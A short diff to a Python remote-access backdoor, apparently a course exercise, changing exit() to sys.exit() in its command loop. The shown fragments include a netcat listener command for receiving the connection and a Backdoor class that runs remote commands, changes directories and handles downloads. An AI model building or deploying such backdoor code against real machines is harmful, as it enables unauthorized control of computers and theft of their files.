@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #needs debugging to work in python3 - bytes-like object error
 
-import base64, json, os, socket, subprocess
+import base64, json, os, socket, subprocess, sys
 
 #to open listening connection on target computer using netcat:
 #nc -vv -l -p 4444
@@ -51,7 +51,7 @@ class Backdoor:
                 if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
                     #this works because data is sent as json object and unpacked first; receives var command as list
                     self.connection.close()
-                    exit()
+                    sys.exit() #sys.exit() instead of exit() to avoid error popups on different oses
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
